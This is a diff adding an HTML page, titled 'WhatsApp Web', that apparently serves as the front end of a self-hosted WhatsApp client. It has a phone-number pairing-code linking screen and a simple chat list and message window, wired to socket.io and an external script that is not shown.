@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhatsApp Web</title>
+  <link rel="stylesheet" href="whatsapp.css">
+</head>
+<body>
+  <div id="app">
+    <!-- Phone Linking Screen -->
+    <div id="link-screen" class="screen active">
+      <div class="logo">WhatsApp</div>
+      <div class="phone-input">
+        <input type="tel" id="phone" placeholder="+1234567890" maxlength="15">
+        <button id="link-btn">Link Phone</button>
+      </div>
+      <div id="link-code" class="code-display" style="display:none;">
+        <div class="code-title">Link this phone</div>
+        <code id="code-display"></code>
+        <div class="code-instructions">
+          1. Open WhatsApp app<br>
+          2. Go to Linked Devices<br>
+          3. Tap "Link with phone number"<br>
+          4. Enter code above
+        </div>
+        <button id="refresh-code">New Code</button>
+      </div>
+      <div id="status"></div>
+    </div>
+
+    <!-- Chat Screen -->
+    <div id="chat-screen" class="screen">
+      <div class="chat-header">
+        <div class="back-btn" id="back-btn">←</div>
+        Chats
+      </div>
+      <div id="chats-list"></div>
+      <div id="chat-window" style="display:none;">
+        <div class="chat-messages" id="messages"></div>
+        <input type="text" id="message-input" placeholder="Type a message">
+      </div>
+    </div>
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="app.js"></script>
+</body>
+  </html>
